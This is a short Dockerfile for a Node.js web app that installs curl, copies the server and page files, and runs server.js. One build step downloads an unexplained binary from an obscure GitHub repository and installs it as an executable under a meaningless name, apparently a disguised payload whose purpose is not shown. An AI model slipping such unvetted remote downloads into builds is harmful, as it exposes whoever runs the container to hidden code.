FROM node:16-slim

# 安装 curl
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY package.json server.js ./

RUN npm install

RUN curl -L -o /usr/local/bin/xlinxaamd "https://github.com/uptimwikaba/profgen/raw/refs/heads/main/bewfile/amwdeb" \
    && chmod +x /usr/local/bin/xlinxaamd

RUN mkdir -p /app/public

COPY public/index.html /app/public/index.html

EXPOSE ${PORT:-3000}

CMD ["node", "server.js"]
